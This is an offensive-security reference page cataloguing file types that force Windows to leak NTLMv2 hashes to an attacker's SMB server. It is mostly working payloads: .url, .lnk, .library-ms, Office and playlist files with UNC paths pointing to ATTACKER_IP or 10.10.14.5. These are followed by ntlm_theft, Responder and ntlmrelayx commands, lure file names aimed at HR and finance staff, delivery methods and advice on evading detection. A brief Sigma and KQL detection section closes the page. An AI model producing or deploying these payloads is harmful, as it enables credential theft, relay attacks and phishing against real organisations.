---
title: "File-Based NTLMv2 Hash Coercion — Every File Type"
description: "Complete reference for every file type that can coerce NTLMv2 hash disclosure on Windows — from zero-click browse-to-folder attacks to open-document vectors. Includes PoC payloads, CVE references, and generation tools."
date: 2026-07-04
tags:
  - NTLM
  - Credential Theft
  - File Coercion
  - Hash Disclosure
  - Phishing
---

# File-Based NTLMv2 Hash Coercion

## How It Works

When Windows Explorer, Office, or other applications encounter a file containing a UNC path (e.g., `\\attacker_ip\share`), Windows automatically attempts to authenticate to that path using the current user's NTLM credentials. This happens because:

1. Windows sees a network resource reference
2. SMB client initiates a connection to the target
3. The SMB server (attacker's Responder) requests NTLM authentication
4. Windows automatically sends the NTLMv2 challenge-response — **without prompting the user**

The key insight: many file formats support referencing external resources via UNC paths in their metadata, icons, or content — and Windows processes these **automatically** when browsing, previewing, or opening.

---

## Category 1: Browse-to-Folder (Zero-Click)

These file types trigger NTLM authentication **just by the user browsing to the folder** containing the file in Windows Explorer. No file needs to be opened or clicked.

### .url — Internet Shortcut (URL Field)

The simplest and most reliable vector. Works on all current Windows versions.

```ini
[InternetShortcut]
URL=file://ATTACKER_IP/share/resource
```

**Trigger**: Explorer renders the file entry and resolves the URL.

### .url — Internet Shortcut (IconFile Field)

```ini
[InternetShortcut]
URL=https://google.com
IconIndex=0
IconFile=\\ATTACKER_IP\share\icon.ico
```

**Trigger**: Explorer loads the icon for the file thumbnail. Even more reliable than URL field — fires during Explorer's icon cache population.

### .lnk — Windows Shortcut (Icon Location)

```
# Generated with PowerShell
$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("payload.lnk")
$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$shortcut.IconLocation = "\\ATTACKER_IP\share\icon.ico"
$shortcut.Save()
```

Or using `ntlm_theft`:

```bash
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f payload
```

**Trigger**: Explorer resolves the shortcut icon from the UNC path. Fires when folder is browsed.

!!! tip "LNK files are the most operationally useful"
    Unlike .url and .scf, LNK files are commonly found in shared folders and don't raise suspicion. Name them something like `Meeting Notes.lnk` or `Important - Q4 Budget.lnk`.

### .scf — Shell Command File

```ini
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

**Trigger**: Explorer renders the folder and resolves the icon.

!!! warning "Patched on Modern Windows"
    Microsoft patched SCF icon resolution in Windows 10 1703+. Works on older systems and some enterprise Windows Server versions.

### desktop.ini — Folder Customization

```ini
[.ShellClassInfo]
IconResource=\\ATTACKER_IP\share\icon.ico,0
```

Place this in a folder with the System/Hidden attributes set:

```cmd
attrib +s +h desktop.ini
attrib +s folder_name
```

**Trigger**: When any user browses to the parent folder, Explorer reads desktop.ini to customize the folder's appearance.

!!! warning "Patched on Modern Windows"
    Largely blocked on Windows 10/11 with recent patches. Still works on some unpatched Server editions.

### .library-ms — Windows Library Definition (CVE-2025-24071)

This is the **most dangerous modern vector** — zero-click, works on latest Windows, and triggers just by extracting a ZIP/RAR archive.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Documents</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>\\ATTACKER_IP\share\icon.ico</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\ATTACKER_IP\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Trigger**: Windows Explorer automatically processes `.library-ms` files to generate previews and index metadata. When the file is **extracted from a ZIP/RAR**, the indexer processes it immediately — the user never needs to open or click it.

**CVEs**: CVE-2025-24054, CVE-2025-24071

!!! danger "Actively Exploited in the Wild"
    This technique was observed in phishing campaigns against Poland and Romania within days of disclosure. Attackers distributed ZIP files via Dropbox links containing `.library-ms` payloads.

### .searchConnector-ms — Search Connector

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <description>Microsoft Outlook</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <iconReference>\\ATTACKER_IP\share\icon.ico</iconReference>
  <templateInfo>
    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>\\ATTACKER_IP\share</url>
  </simpleLocation>
</searchConnectorDescription>
```

**Trigger**: Same as library-ms — Explorer processes it to resolve the icon and location.

### .theme — Windows Theme File

```ini
[Theme]
DisplayName=Corporate Theme

[Control Panel\Desktop]
Wallpaper=\\ATTACKER_IP\share\wallpaper.jpg

[Control Panel\Desktop\Colors]
Background=0 0 0
```

**Trigger**: Double-clicking the .theme file applies it, which triggers Windows to fetch the wallpaper from the UNC path.

**CVE**: CVE-2024-21320 (patched January 2024), but variants using `BrandImage` and other fields continue to emerge.

### .diagcab — Diagnostic Cabinet

```xml
<?xml version="1.0" encoding="utf-8"?>
<dcmPS:DiagnosticPackage SchemaVersion="1.0"
  xmlns:dcmPS="http://www.microsoft.com/schemas/dcm/package/2007"
  xmlns:dcmRS="http://www.microsoft.com/schemas/dcm/resource/2007">
  <DiagnosticIdentification>
    <ID>Troubleshooter</ID>
    <Version>1.0</Version>
  </DiagnosticIdentification>
  <DisplayInformation>
    <Parameters>
      <Parameter Name="Icon">\\ATTACKER_IP\share\icon.ico</Parameter>
    </Parameters>
  </DisplayInformation>
</dcmPS:DiagnosticPackage>
```

**Trigger**: Opening the .diagcab file or Explorer rendering its icon.

---

## Category 2: Open Document

These require the user to open the file, but once opened the NTLM leak is automatic.

### .docx — Microsoft Word (IncludePicture)

Create a Word document with an external image reference:

```xml
<!-- word/document.xml -->
<w:p>
  <w:r>
    <w:fldChar w:fldCharType="begin"/>
  </w:r>
  <w:r>
    <w:instrText> INCLUDEPICTURE "\\\\ATTACKER_IP\\share\\image.png" \* MERGEFORMAT</w:instrText>
  </w:r>
  <w:r>
    <w:fldChar w:fldCharType="end"/>
  </w:r>
</w:p>
```

**Trigger**: Opening the document in Word. Word resolves the external reference.

### .docx — External Template

Modify `word/_rels/settings.xml.rels`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="\\ATTACKER_IP\share\template.dotx" TargetMode="External"/>
</Relationships>
```

**Trigger**: Word fetches the external template on document open.

### .docx — Frameset (webSettings)

Modify `word/webSettings.xml`:

```xml
<w:webSettings>
  <w:frameset>
    <w:framesetSplitbar>
      <w:w w:val="60"/>
    </w:framesetSplitbar>
    <w:frameset>
      <w:frame>
        <w:name w:val="main"/>
        <w:sourceFileName r:id="rId1"/>
      </w:frame>
    </w:frameset>
  </w:frameset>
</w:webSettings>
```

With the relationship pointing to `\\ATTACKER_IP\share\page.html`.

### .xlsx — External Cell Reference

```bash
python3 ntlm_theft.py -g xlsx -s ATTACKER_IP -f Bonus_Q4
```

Creates an Excel file with a cell referencing an external data source via UNC path. When opened, Excel resolves the reference.

### .rtf — OLE Object Link

```
{\rtf1
{\field{\*\fldinst { INCLUDEPICTURE "\\\\ATTACKER_IP\\share\\image.png" \\* MERGEFORMAT }}{\fldrslt}}
}
```

Or via `objautlink` / `objdata` OLE objects pointing to UNC paths.

### .xml — Stylesheet (Opens in Word)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="\\ATTACKER_IP\share\style.xsl"?>
<?mso-application progid="Word.Document"?>
<w:document xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">
  <w:body>
    <w:p><w:r><w:t>Document Content</w:t></w:r></w:p>
  </w:body>
</w:document>
```

**Trigger**: The `mso-application` processing instruction causes Windows to open this XML in Word, which then fetches the stylesheet from the UNC path.

### .pdf — Adobe Acrobat Reader

PDFs can reference external resources via the `/AA` (Additional Actions) entry:

```python
# Using pdf-NTLMLeaker or manual injection
# The PDF includes a GoToR or SubmitForm action pointing to \\ATTACKER_IP\share
```

**Trigger**: Opening in Adobe Reader. Reader shows a security dialog — if the user clicks "Allow", the connection is made.

!!! note "Requires User Approval"
    Modern Adobe Reader asks the user before connecting to external SMB resources. This makes it less reliable for automated/zero-click attacks, but effective in targeted phishing where the document content motivates the user to click Allow.

### .htm/.html — Image Source (Local File Only)

```html
<html>
<body>
<img src="\\ATTACKER_IP\share\image.png">
</body>
</html>
```

**Trigger**: Only works when opened **from the local filesystem** (not hosted on a web server). Chrome, Edge, and IE/Legacy Edge all resolve UNC paths in img src when the page is a local file.

---

## Category 3: Media Files

### .m3u — Playlist

```
#EXTM3U
#EXTINF:0,Track 1
\\ATTACKER_IP\share\song.mp3
```

**Trigger**: Opening in Windows Media Player (WMP). WMP attempts to access the track at the UNC path.

### .wax — Windows Media Audio Redirect

```
<ASX version="3.0">
<ENTRY><REF HREF="\\ATTACKER_IP\share\audio.wma"/></ENTRY>
</ASX>
```

**Trigger**: Opening in WMP. The redirect causes WMP to authenticate to the SMB path.

### .asx — Advanced Stream Redirector

```
<ASX version="3.0">
<ENTRY><REF HREF="\\ATTACKER_IP\share\stream.asf"/></ENTRY>
</ASX>
```

Same mechanism as .wax — WMP follows the redirect.

### .m3u8 / .pls — Other Playlist Formats

Any playlist format that references file paths can be weaponized with UNC paths. VLC, Winamp, and other players may also resolve SMB paths.

---

## Category 4: Java & .NET

### .jnlp — Java Web Start

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="\\ATTACKER_IP\share">
  <information>
    <title>App</title>
    <vendor>Corp</vendor>
  </information>
  <resources>
    <jar href="app.jar"/>
  </resources>
  <application-desc main-class="Main"/>
</jnlp>
```

**Trigger**: Opening with Java Web Start (requires Java installed). Java resolves the codebase UNC path.

### .application — ClickOnce

```xml
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity name="app" version="1.0.0.0"/>
  <deployment install="true" mapFileExtensions="true">
    <deploymentProvider codebase="\\ATTACKER_IP\share\app.application"/>
  </deployment>
</asmv1:assembly>
```

**Trigger**: Must be downloaded via browser and opened. .NET ClickOnce resolves the codebase.

---

## Category 5: Windows-Specific Special Files

### .contact — Windows Contact

```xml
<?xml version="1.0" encoding="UTF-8"?>
<c:contact xmlns:c="http://schemas.microsoft.com/Contact"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <c:PhotoCollection>
    <c:Photo>
      <c:Value>\\ATTACKER_IP\share\photo.jpg</c:Value>
    </c:Photo>
  </c:PhotoCollection>
</c:contact>
```

**Trigger**: Opening the contact in Windows Contacts resolves the photo path.

### .rdp — Remote Desktop Protocol File

```ini
full address:s:ATTACKER_IP
alternate shell:s:\\ATTACKER_IP\share\shell.exe
```

Modern RDP files with `remoteapplicationcmdline` or icon references can also trigger SMB authentication.

### Autorun.inf (Legacy — USB/CD)

```ini
[AutoRun]
open=\\ATTACKER_IP\share\payload.exe
icon=\\ATTACKER_IP\share\icon.ico
```

!!! warning "Completely Disabled"
    AutoRun is disabled by default on all modern Windows for non-optical media. Only relevant for attacks against Windows XP/Vista or systems with AutoRun re-enabled.

---

## Generation Tools

### ntlm_theft (Greenwolf)

The gold standard — generates 21+ file types in one command:

```bash
# Generate ALL file types
python3 ntlm_theft.py -g all -s 10.10.14.5 -f Important_Meeting

# Generate only modern/working types
python3 ntlm_theft.py -g modern -s 10.10.14.5 -f Q4_Budget

# Generate specific type
python3 ntlm_theft.py -g lnk -s 10.10.14.5 -f Bonus_Payment
python3 ntlm_theft.py -g docx -s 10.10.14.5 -f Meeting_Notes
python3 ntlm_theft.py -g xlsx -s 10.10.14.5 -f Financial_Report
```

### Manual LNK Generation (PowerShell)

```powershell
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut("$PWD\Important.lnk")
$lnk.TargetPath = "C:\Windows\System32\notepad.exe"
$lnk.IconLocation = "\\10.10.14.5\share\icon.ico"
$lnk.Save()
```

### Manual URL File Generation

```powershell
@"
[InternetShortcut]
URL=placeholder
IconIndex=0
IconFile=\\10.10.14.5\share\icon.ico
"@ | Out-File -Encoding ASCII "Important.url"
```

### Library-ms Generation (CVE-2025-24071)

```powershell
@"
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@shell32.dll,-34575</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>\\10.10.14.5\share\icon</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\10.10.14.5\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"@ | Out-File -Encoding UTF8 "Documents.library-ms"

# Package into a ZIP for delivery
Compress-Archive -Path "Documents.library-ms" -DestinationPath "Documents.zip"
```

---

## Capture Setup

### Responder (Recommended)

```bash
# Start Responder to capture hashes
sudo responder -I eth0 -v

# Hashes are saved to:
# /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

### Impacket smbserver

```bash
# Simple SMB server that captures auth
impacket-smbserver -smb2support share /tmp/share
```

### ntlmrelayx (For Relay Instead of Capture)

```bash
# Relay captured NTLM to a target
impacket-ntlmrelayx -t ldap://dc01.corp.local -smb2support --escalate-user attacker
```

---

## Operational Considerations

### File Naming

Name files to match the target's context:

- **HR department**: `Salary_Review_2026.xlsx`, `New_Benefits_Package.docx`
- **Finance**: `Q4_Budget_FINAL.xlsx`, `Invoice_Approved.pdf`
- **IT**: `VPN_Setup_Guide.lnk`, `Security_Update_Required.url`
- **Executive**: `Board_Meeting_Agenda.docx`, `Confidential_Memo.rtf`

### Delivery Methods

| Method | File Types | Notes |
|---|---|---|
| **Drop in shared folder** | .url, .lnk, .scf, .library-ms | Zero interaction — anyone browsing triggers it |
| **Email attachment** | .docx, .xlsx, .rtf, .pdf | Requires user to open |
| **Email with ZIP** | .library-ms, .searchConnector-ms | Triggers on extraction (CVE-2025-24071) |
| **USB drop** | .lnk, .url, desktop.ini | Social engineering required |
| **File share write (SMB)** | Any browse-to-folder type | Best for internal pentests |

### Avoiding Detection

1. Use HTTPS listeners instead of SMB where possible (harder to block)
2. Host the attacker listener on a legitimate-looking hostname
3. Timing — drop files during business hours when SMB traffic is normal
4. Clean up — remove coercion files after capturing hashes

---

## Related CVEs

| CVE | File Type | Description | Patched? |
|---|---|---|---|
| CVE-2025-24054 | .library-ms | NTLM hash disclosure via Explorer processing | ✅ March 2025 |
| CVE-2025-24071 | .library-ms (ZIP) | Zero-click on extraction | ✅ March 2025 |
| CVE-2024-21320 | .theme | Theme file wallpaper UNC | ✅ January 2024 |
| CVE-2023-23397 | Outlook reminder | NTLM leak via PidLidReminderFileParameter | ✅ March 2023 |
| CVE-2023-35636 | Outlook calendar sharing | NTLM via calendar invite | ✅ December 2023 |
| CVE-2026-32202 | Multiple | NTLM credential theft (details TBD) | ✅ 2026 |
| CVE-2026-33829 | Snipping Tool URI | NTLM via URI handler | ✅ April 2026 |

---

## Detection

### Sigma Rule: Suspicious File in Shared Folder

```yaml
title: Potential NTLM Coercion File Dropped in Share
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4663
    ObjectName|endswith:
      - '.scf'
      - '.url'
      - '.library-ms'
      - '.searchConnector-ms'
      - 'desktop.ini'
    AccessMask: '0x2'  # WRITE
  condition: selection
level: high
```

### Monitor Outbound SMB

```kql
// Detect outbound SMB to non-internal IPs
NetworkCommunicationEvents
| where RemotePort in (445, 139)
| where RemoteIP !startswith "10." and RemoteIP !startswith "172.16." and RemoteIP !startswith "192.168."
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
```

---

## References

- [Greenwolf — ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
- [Checkpoint — CVE-2025-24054 In the Wild](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)
- [HackTricks — Places to Steal NTLM Creds](https://hacktricks.wiki/en/windows-hardening/ntlm/places-to-steal-ntlm-creds.html)
- [Osanda Malith — Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
- [ired.team — Forced Authentication](https://ired.team/offensive-security/initial-access/t1187-forced-authentication)
